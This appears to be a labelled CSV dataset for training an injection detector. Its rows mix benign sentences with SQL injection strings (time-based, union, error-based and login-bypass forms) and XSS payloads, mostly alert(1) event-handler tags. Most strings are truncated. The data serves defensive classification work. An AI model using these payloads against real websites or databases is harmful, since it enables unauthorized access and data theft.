Payload,Label,text_label,ID
"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ",2,SQLi,21226
/><img/onerror=\x22javascript:alert(1)\x22src=xxx:,1,XSS,594
<dd onpointerleave=alert(1)>XSS</dd>,1,XSS,4722
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5830
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10752
Randomly select a book.,0,normal,24348
"-1999 ) union all select 1779,1779,1779,1779,1779,",2,SQLi,22274
"1' where 4150 = 4150 and elt ( 8012 = 6026,6026 ) ",2,SQLi,18742
1 where 4985 = 4985 order by 1#,2,SQLi,22423
"<frame onmousemove=""alert(1)"">test</frame>",1,XSS,4801
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10637
"<source onmouseup=""alert(1)"">test</source>",1,XSS,4798
1' ) where 3375 = 3375 or 8315 = ( select count ( ,2,SQLi,20979
"RLIKE SLEEP(5) AND 1337""=""1337",2,SQLi,11237
"<style>@keyframes x{}</style><tfoot style=""animati",1,XSS,8659
"<svg><use href=""data:image/svg+xml;base64,PHN2ZyBp",1,XSS,164
"<img src=x\x09onerror=""javascript:alert(1)"">",1,XSS,672
"{""id"":null,""firstName"":""Kah Hong"",""lastName"":""Tan""",0,normal,26852
"-3954' ) ) union all select 2417,2417--",2,SQLi,14311
"{""id"":null,""name"":""society""}",0,normal,27317
"1' and row ( 6237,7469 ) > ( select count ( * ) ,c",2,SQLi,16055
Let's explore where the city skyline is visible.,0,normal,23767
select ( case when ( 7980 = 3703 ) then 7980 else ,2,SQLi,14831
Carefully select a wine.,0,normal,24820
Where's the missing jigsaw piece?,0,normal,22743
<dir id=x tabindex=1 onfocus=alert(1)></dir>,1,XSS,5545
1' ) ) ) or 8315 = ( select count ( * ) from sysib,2,SQLi,22394
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,7996
Select the ideal setting for the occasion.,0,normal,24025
materialized,0,normal,23180
"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20dela",2,SQLi,10903
"<style>@keyframes x{}</style><button style=""animat",1,XSS,7761
"<small onpaste=""alert(1)"" contenteditable>test</sm",1,XSS,4840
"1%"" ) or extractvalue ( 1297,concat ( 0x5c,0x71717",2,SQLi,18680
"<object oncontextmenu=""alert(1)"">test</object>",1,XSS,6551
Carefully select the options.,0,normal,24285
"<progress onmouseenter=""alert(1)"">test</progress>",1,XSS,4484
<source onpointerdown=alert(1)>XSS</source>,1,XSS,3719
""")) or sleep(__TIME__)=""",2,SQLi,10840
<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><,1,XSS,6143
or 0=0 â,2,SQLi,9959
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://www.s",1,XSS,1551
"1%"" and 5411 = 7697 and ""%"" = """,2,SQLi,14821
select ( case when ( 8716 = 1338 ) then 1 else 871,2,SQLi,18431
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SC,1,XSS,768
<style>:target {color:red;}</style><template id=x ,1,XSS,5696
Select the appropriate app for the task.,0,normal,24257
"<video src=_ onloadstart=""alert(1)"">",1,XSS,9703
"{""id"":null,""name"":""Pagumon""}",0,normal,27496
Select a fabric for the sewing project.,0,normal,24244
1 ) ) as xzcl where 2332 = 2332,2,SQLi,19689
<style>:target {transform: rotate(180deg);}</style,1,XSS,4520
"select count ( * ) from generate_series ( 1,500000",2,SQLi,12414
As a Registered User you will be able to select to,0,normal,26355
Select your consequence.,0,normal,24879
"<optgroup onmouseout=""alert(1)"">test</optgroup>",1,XSS,3295
"<! foo=""[[[x]]""><x foo=""]foo><script>alert(91)</sc",1,XSS,9014
&lt;STYLE&gt;.XSS{background-image:url(&quot;javas,1,XSS,1405
&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&ap,1,XSS,1384
"and (select substring(@@version,1,1))='M'",2,SQLi,10343
Fetch records where available.,0,normal,23315
select ( case when ( 1726 = 4080 ) then 1726 else ,2,SQLi,22058
"\"";;alert(';XSS';);//",1,XSS,1640
1' ) ) ) rlike ( select * from ( select ( sleep ( ,2,SQLi,14086
"<font onmouseout=""alert(1)"">test</font>",1,XSS,8803
Choose fields where applicable.,0,normal,23294
"<listing onkeypress=""alert(1)"" contenteditable>tes",1,XSS,6409
<base href=//0>,1,XSS,9077
1 ) ) as wmxa where 6485 = 6485 and 8148 = like ( ,2,SQLi,17566
"<datalist onkeydown=""alert(1)"" contenteditable>tes",1,XSS,5451
if ( 8858 = 5680 ) select 8858 else drop function ,2,SQLi,12171
"<slot ondblclick=""alert(1)"">test</slot>",1,XSS,5081
1 where 8135 = 8135,2,SQLi,21562
1' ) ) as nhkp where 8030 = 8030,2,SQLi,13567
1 ) where 9344 = 9344,2,SQLi,17076
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3853
"She asked, ""Where is my missing sock?""",0,normal,22912
-8922 or 5903 = ( 'qqpjq'|| ( select case 5903 whe,2,SQLi,21124
"<div onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,6491
or ''=',2,SQLi,10148
"-2375 union all select 1573,1573,1573,1573#",2,SQLi,13831
"<style>@keyframes x{}</style><datalist style=""anim",1,XSS,7157
The run is for select dates from June through Sept,0,normal,25381
"<track ondblclick=""alert(1)"">test</track>",1,XSS,6613
<td onpointerup=alert(1)>XSS</td>,1,XSS,5182
1 where 4091 = 4091,2,SQLi,20736
1%' order by 1#,2,SQLi,12333
1' or 4411 = ( select count ( * ) from sysusers as,2,SQLi,18271
"1"" ) as fcrx where 2929 = 2929 and 2820 = 5133",2,SQLi,19106
"{""id"":null,""firstName"":""Wei Li"",""lastName"":""Lam"",""",0,normal,26768
<xss id=x tabindex=1 onactivate=alert(1)></xss>,1,XSS,2496
-1629' ) ) ) or 4493 = utl_inaddr.get_host_address,2,SQLi,22334
"-2782' ) ) or 1 group by concat ( 0x7171706a71, ( ",2,SQLi,19423
if ( 1665 = 3845 ) select 1665 else drop function ,2,SQLi,22164
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;""",1,XSS,846
<em onpointerleave=alert(1)>XSS</em>,1,XSS,8737
AND 1 = utl_inaddr.get_host_address ( ( SELECT DIS,2,SQLi,11919
or isNULL ( 1/0 ) /*,2,SQLi,11874
1'+ ( select 'cwta' where 6091 = 6091,2,SQLi,12418
"<hgroup draggable=""true"" ondrag=""alert(1)"">test</h",1,XSS,7970
Where's the farmhouse?,0,normal,23566
"<label onpaste=""alert(1)"" contenteditable>test</la",1,XSS,7343
1 rlike ( select ( case when ( 6795 = 5898 ) then ,2,SQLi,13894
"Cyril and Augustine differ, as we should expect, i",0,normal,26252
We have now to select such portion of this system ,0,normal,25175
"<address onpaste=""alert(1)"" contenteditable>test</",1,XSS,7140
<animatetransform onpointerout=alert(1)>XSS</anima,1,XSS,2966
"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x717170",2,SQLi,15754
-1396 where 5838 = 5838 or 9323 = 9323#,2,SQLi,18916
"-6431' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr (",2,SQLi,15479
<style>:target {color: red;}</style><meta id=x sty,1,XSS,5775
"1"" where 9756 = 9756",2,SQLi,17435
Where's your SQL purpose?,0,normal,23432
1' ) ) and 4650 = 1322#,2,SQLi,18347
"<style>@keyframes x{}</style><dialog style=""animat",1,XSS,2532
%2b(select*from(select(sleep(5)))a)%2b',2,SQLi,11141
"{""id"":null,""firstName"":""P Elan"",""lastName"":""Charan",0,normal,27618
"1 ) ) union all select null,null,null,null,null,nu",2,SQLi,14719
<ul id=x tabindex=1 onfocusin=alert(1)></ul>,1,XSS,8432
"<tbody onmouseout=""alert(1)"">test</tbody>",1,XSS,4920
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%",1,XSS,5904
<keygen id=x tabindex=1 ondeactivate=alert(1)></ke,1,XSS,8289
1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr,2,SQLi,20646
Select Settings > Back up & syncand toggle Back up,0,normal,25611
<ruby onpointermove=alert(1)>XSS</ruby>,1,XSS,5659
"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 )",2,SQLi,16130
1%' ) ) ( select ( case when ( 4587 = 4587 ) then ,2,SQLi,22484
<map onfocusout=alert(1) tabindex=1 id=x></map><in,1,XSS,5910
"<img onmousemove=""alert(1)"">test</img>",1,XSS,7376
1' in boolean mode ) and ( select 2* ( if ( ( sele,2,SQLi,19365
"If you have never used down pillows before, the fo",0,normal,26047
1,0,normal,26668
"<style>@keyframes x{}</style><wbr style=""animation",1,XSS,6724
Select a recipe to try out.,0,normal,24229
select,0,normal,26606
1%' and 7533 = 7533 and '%' = ',2,SQLi,12689
<hr onpointerleave=alert(1)>XSS</hr>,1,XSS,8267
<applet onblur=alert(1) tabindex=1 id=x></applet><,1,XSS,7696
1 where 6304 = 6304,2,SQLi,19525
<textarea id=x tabindex=1 onbeforeactivate=alert(1,1,XSS,8328
"{""id"":null,""name"":""effort""}",0,normal,27524
"-5243"" where 2105 = 2105 or 4144 = ( select upper ",2,SQLi,12268
1 or pg_sleep ( __TIME__ ) --,2,SQLi,11424
<div onpointerout=alert(1)>XSS</div>,1,XSS,1828
"-5160' ) union all select 8067,8067,8067,8067,8067",2,SQLi,21935
"1' where 7104 = 7104 union all select null,null,nu",2,SQLi,12332
`'><script>\xE3\x80\x80javascript:alert(1)</script,1,XSS,561
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,4110
Select your dream.,0,normal,24822
"<article onmousedown=""alert(1)"">test</article>",1,XSS,5438
"<style>@keyframes x{}</style><th style=""animation-",1,XSS,4440
"benchmark(50000000,MD5(1))",2,SQLi,10385
1 ) ) as kgit where 1919 = 1919 and char ( 109 ) |,2,SQLi,17829
Select your goal.,0,normal,24840
<svg><font onload=alert(1)></font>,1,XSS,4409
"{""id"":null,""firstName"":""Luke"",""lastName"":""Yiin"",""s",0,normal,26982
"1%"" ) ) ) rlike ( select * from ( select ( sleep (",2,SQLi,18076
Where can I select a wine for the dinner party?,0,normal,23961
admin') or '1'='1'#,2,SQLi,9920
Don't forget to select rugs and carpet that emit l,0,normal,26233
1' ) where 6746 = 6746 procedure analyse ( extract,2,SQLi,22349
"-9451%"" ) union all select 9963,9963,9963--",2,SQLi,18883
1 ) ) as bjxd where 4299 = 4299,2,SQLi,15099
"<sub draggable=""true"" ondragstart=""alert(1)"">test<",1,XSS,2819
1'|| ( select 'allj' where 7334 = 7334,2,SQLi,16727
1%' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 12,2,SQLi,18795
"To capture the entire screen, select Command+Shift",0,normal,25281
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,5785
1'+ ( select 'swxi' where 7651 = 7651 and 6414 = (,2,SQLi,20963
1' ) as wnys where 6457 = 6457 or 8514 = benchmark,2,SQLi,16166
1%' ) or 8421 = ( select count ( * ) from generate,2,SQLi,20112
"-6381%"" or 8571 = 8571--",2,SQLi,19172
<x oncut=alert(1)>cut this!,1,XSS,9718
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHA",2,SQLi,10702
"{""id"":16436,""name"":""jmeter test <DO NOT DELETE""}",0,normal,26797
"-1015"" ) ) union all select 6624,6624#",2,SQLi,17399
1'|| ( select 'puco' where 2605 = 2605 union all s,2,SQLi,21667
"<frame onmouseleave=""alert(1)"">test</frame>",1,XSS,4898
Where's the museum?,0,normal,23508
Merge the financial accounts for analysis.,0,normal,22936
select ( case when ( 2576 = 7563 ) then 2576 else ,2,SQLi,20424
"Select ""Custom Image"" from with the Media Player a",0,normal,25680
"<a href=""javas cript:alert(1)"">XSS</a>",1,XSS,149
"1' union all select null,null,null,null,null,null,",2,SQLi,16672
"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4",2,SQLi,18755
"<sup draggable=""true"" ondragstart=""alert(1)"">test<",1,XSS,8558
hi or a = a,2,SQLi,22486
1' ) ) as bsvk where 5985 = 5985 and extractvalue ,2,SQLi,15466
trigger,0,normal,23157
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4446
url(javascript:alert(''),1,XSS,7449
<svg><xss onload=alert(1)>,1,XSS,237
"-5013' ) ) ) or 1570 = convert ( int, ( select cha",2,SQLi,15904
"{""id"":null,""firstName"":""Penny"",""lastName"":""Tan"",""s",0,normal,27058
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10757
<image3 onpointerup=alert(1)>XSS</image3>,1,XSS,7126
Be sure the toys you select are suitable for babie,0,normal,26334
exec(@s),2,SQLi,10126
1' ) where 2928 = 2928,2,SQLi,13714
"<hgroup onbeforecut=""alert(1)"" contenteditable>tes",1,XSS,3085
"<style><img src=""</style><img src=x onerror=javasc",1,XSS,633
year,0,normal,23200
"1"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( ch",2,SQLi,18880
"<frameset onkeyup=""alert(1)"" contenteditable>test<",1,XSS,2667
That additional money goes to select charities sup,0,normal,25495
The role of Select midfield powerhouse is filled a,0,normal,25382
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10529
"-9054"" ) as rgyu where 3792 = 3792 order by 1--",2,SQLi,15839
1) or pg_sleep(__TIME__)--,2,SQLi,10063
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) an",2,SQLi,14791
select * from users where id = 1 <@1$ or 1 = 1 -- ,2,SQLi,12078
The depth of snow will determine the size of the s,0,normal,25461
"-3074' ) ) union all select 6131,6131,6131,6131,61",2,SQLi,20598
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,14112
<img src=x onerror=alert('XSS');>,1,XSS,9689
1' ) ) and 5556 = ( select count ( * ) from all_us,2,SQLi,20261
"-6118 union all select 5906,5906,5906,5906,5906#",2,SQLi,19204
When: Select dates between April 21 and July 29 (s,0,normal,25138
<q onpointerout=alert(1)>XSS</q>,1,XSS,5252
"<style onmouseup=""alert(1)"">test</style>",1,XSS,8536
<style>:target {transform: rotate(180deg);}</style,1,XSS,7429
"-9859"" ) ) ) union all select 6595,6595,6595,6595,",2,SQLi,12348
"{""id"":null,""name"":""happened""}",0,normal,27588
"<style>@keyframes x{}</style><option style=""animat",1,XSS,7982
where,0,normal,26530
foo\'; alert(document.cookie);//';,1,XSS,1737
Let's find out where the farmer's market is.,0,normal,23784
"1%' ) and extractvalue ( 7982,concat ( 0x5c,0x7171",2,SQLi,14487
"<plaintext draggable=""true"" ondragenter=""alert(1)""",1,XSS,4258
"We need to reflect, select, revise, and edit, whil",0,normal,25172
"<time onbeforecopy=""alert(1)"" contenteditable>test",1,XSS,2477
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10759
"{""id"":null,""firstName"":""ÃÂ¥ÃÂ¿Ã¢â¬âÃÂ¦ÃÂºÃÂ"",""lastName"":",0,normal,27596
"<sub onkeyup=""alert(1)"" contenteditable>test</sub>",1,XSS,3716
<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>,1,XSS,6707
1' in boolean mode ) and 6055 = ctxsys.drithsx.sn ,2,SQLi,18191
1' and 6414 = ( select count ( * ) from rdb$fields,2,SQLi,17094
from,0,normal,26516
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,5192
Or select a Medicare Advantage plan that includes ,0,normal,25803
1'+ ( select 'tzyz' where 4912 = 4912 or 6979 = li,2,SQLi,21859
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,16459
1%' ) ) ) and 3916 = 6327--,2,SQLi,14213
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,7846
"1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex (",2,SQLi,12643
1 ) where 4710 = 4710 procedure analyse ( extractv,2,SQLi,14055
"-9725' ) union all select 2481,2481,2481,2481,2481",2,SQLi,13034
"{""id"":null,""firstName"":""Jamus"",""lastName"":""Kwek"",""",0,normal,27151
"-8695 union all select 6087,6087,6087,6087,6087,60",2,SQLi,21488
<button id=x tabindex=1 onactivate=alert(1)></butt,1,XSS,6767
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10796
"<svg xmlns=""#""><script>alert(1)</script></svg>",1,XSS,1127
-2361' ) ) as mzhv where 2905 = 2905 or 9026 = 538,2,SQLi,17628
"{""id"":null,""name"":""Marsh Frog""}",0,normal,27258
1%' or sleep ( 5 ) #,2,SQLi,18736
"select * from users where id = 1 or ""?,"" or 1 = 1 ",2,SQLi,11546
Select a scenic view for your landscape.,0,normal,22989
grant,0,normal,23167
"<style>@keyframes x{}</style><samp style=""animatio",1,XSS,4361
"1%"" ) ) and char ( 107 ) ||char ( 121 ) ||char ( 9",2,SQLi,14117
1' rlike ( select ( case when ( 6855 = 1056 ) then,2,SQLi,17730
"{""id"":null,""name"":""major continued""}",0,normal,27601
"1"" ) ) or 6793 = ( select 6793 from pg_sleep ( 5 )",2,SQLi,21403
<li id=x tabindex=1 ondeactivate=alert(1)></li><in,1,XSS,7424
Select your stumble.,0,normal,25019
<a onpointerout=alert(1)>XSS</a>,1,XSS,6655
1' ( select ( case when ( 4587 = 4587 ) then regex,2,SQLi,17487
"<div style=""background:url(test5.svg)"">PRESS ENTER",1,XSS,9163
Where's the best place to enjoy the beach?,0,normal,23714
"<strong onkeypress=""alert(1)"" contenteditable>test",1,XSS,7625
"&lt;XSS STYLE=\""behavior&#58; url(xss&#46;htc);\""&",1,XSS,988
"1' in boolean mode ) union all select null,null,nu",2,SQLi,16017
<style>:target {color:red;}</style><var id=x style,1,XSS,2854
AND 1 = utl_inaddr.get_host_address ( ( SELECT DIS,2,SQLi,11698
<p onpointerdown=alert(1)>XSS</p>,1,XSS,8856
"1"" where 3329 = 3329 or sleep ( 5 ) --",2,SQLi,16339
1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( ,2,SQLi,14999
"1"" ) as ktnq where 9005 = 9005",2,SQLi,17017
"1"" ) or row ( 1045,7562 ) > ( select count ( * ) ,",2,SQLi,17636
"1"" ) ) ) and 7533 = 7533 and ( ( ( ""alvd"" like ""al",2,SQLi,19566
1 ) ) as spdf where 8554 = 8554 or 2633 = dbms_pip,2,SQLi,16869
<button onResume=javascript:alert(1)>,1,XSS,9657
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3042
"1"" and ( 3020 = 3020 ) *6703 and ""itpt"" = ""itpt",2,SQLi,16038
"<style>@keyframes x{}</style><b style=""animation-n",1,XSS,5013
"Now, Vevo first asks you to select your favorite m",0,normal,25857
Where's your SQL background?,0,normal,23387
"<td draggable=""true"" ondragend=""alert(1)"">test</td",1,XSS,3276
<br onfocusout=alert(1) tabindex=1 id=x></br><inpu,1,XSS,7230
"<ul onkeypress=""alert(1)"" contenteditable>test</ul",1,XSS,3686
Filter noise.,0,normal,23061
<caption onfocusout=alert(1) tabindex=1 id=x></cap,1,XSS,6810
"-6158"" ) union all select 3084,3084,3084,3084,3084",2,SQLi,12340
1 ) as zbha where 9700 = 9700 or 6979 = like ( 'ab,2,SQLi,22086
"<br size=\""&{alert('XSS')}\"">",1,XSS,1318
"<main draggable=""true"" ondragstart=""alert(1)"">test",1,XSS,3228
"1 and elt ( 8853 = 1675,1675 ) -- jegm",2,SQLi,17459
1'+ ( select 'ixvd' where 4772 = 4772 and char ( 1,2,SQLi,21202
"The grand-duke, however, continued to pay him his ",0,normal,25436
<marquee loop=1 width=0 onfinish=alert(1)>//INJECT,1,XSS,9855
<menuitem id=x tabindex=1 ondeactivate=alert(1)></,1,XSS,5755
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10620
"-5904"" where 9782 = 9782 or 5903 = ( 'qqpjq'|| ( s",2,SQLi,16396
"<details oncopy=""alert(1)"" contenteditable>test</d",1,XSS,4619
1' waitfor delay '0:0:5',2,SQLi,19484
"{""id"":null,""firstName"":""Quan"",""lastName"":""Yuan"",""s",0,normal,26849
Calculate sums where needed.,0,normal,23256
"alert(String.fromCharCode(88,83,83));'))"">",1,XSS,1302
Let's explore where the forest begins.,0,normal,23672
"-1084 where 1181 = 1181 or make_set ( 9354 = 9354,",2,SQLi,15225
Filter the junk mail.,0,normal,22671
"{""id"":null,""name"":""choice""}",0,normal,26917
"-8266%' ) union all select 8626,8626,8626,8626,862",2,SQLi,13676
admin' #,2,SQLi,9903
"<blink ondblclick=""alert(1)"">test</blink>",1,XSS,5498
"1%"" ) and 6537 = dbms_pipe.receive_message ( chr (",2,SQLi,21678
<button onDrag=javascript:alert(1)>,1,XSS,9603
<data onpointerleave=alert(1)>XSS</data>,1,XSS,1800
select ( case when ( 8993 = 8846 ) then 8993 else ,2,SQLi,12152
<button onStorage=javascript:alert(1)>,1,XSS,9670
"-7248"" ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 11",2,SQLi,21590
Select fix.,0,normal,24614
"1' where 7445 = 7445 union all select null,null,nu",2,SQLi,21434
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,6444
"<img onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,8639
Select flavor.,0,normal,24492
"1"" ) ) as ndbk where 5042 = 5042 and 8594 = ( sele",2,SQLi,15603
1' ) ) ) and 6991 = 5579,2,SQLi,18746
"{""id"":null,""name"":""Onix""}",0,normal,26779
"<tt onmouseup=""alert(1)"">test</tt>",1,XSS,3657
<input4 onpointerup=alert(1)>XSS</input4>,1,XSS,7055
1'|| ( select 'lpej' from dual where 8294 = 8294 o,2,SQLi,15948
AND 1 = utl_inaddr.get_host_address ( ( SELECT DIS,2,SQLi,11374
1' ) and 2716 = ( select count ( * ) from sysusers,2,SQLi,15713
><script>alert(0)</script>,1,XSS,1288
"select count ( * ) from generate_series ( 1,500000",2,SQLi,19917
1' ) ) as xkiq where 9008 = 9008 and sleep ( 5 ) -,2,SQLi,20832
"<object data=""javascript:alert()"">",1,XSS,2139
transaction,0,normal,23174
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10831
-8665' or 6825 = 7840 and 'vbsy' like 'vbsy,2,SQLi,12211
1'|| ( select 'wyng' from dual where 2157 = 2157 u,2,SQLi,12292
"?goto=javascript:alert(1)"",",1,XSS,9876
1'+ ( select vvet where 5221 = 5221 and exp ( ~ ( ,2,SQLi,21926
end and ( ( ( 'hwrs' like 'hwrs,2,SQLi,16492
I want to select a course for professional develop,0,normal,23698
1 ) ) as jrzr where 5194 = 5194 and char ( 107 ) |,2,SQLi,13470
"<center draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,6897
"or ""&",2,SQLi,9887
<style>:target {transform: rotate(180deg);}</style,1,XSS,3613
Select your promise.,0,normal,24951
"<main oncut=""alert(1)"" contenteditable>test</main>",1,XSS,7154
"select count ( * ) from sysibm.systables as t1,sys",2,SQLi,17350
<multicol onfocusout=alert(1) tabindex=1 id=x></mu,1,XSS,6015
1' or 7552 = ( select count ( * ) from rdb$fields ,2,SQLi,13648
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,14116
"<xmp onmousemove=""alert(1)"">test</xmp>",1,XSS,4885
1'+ ( select rhlb where 9477 = 9477,2,SQLi,16527
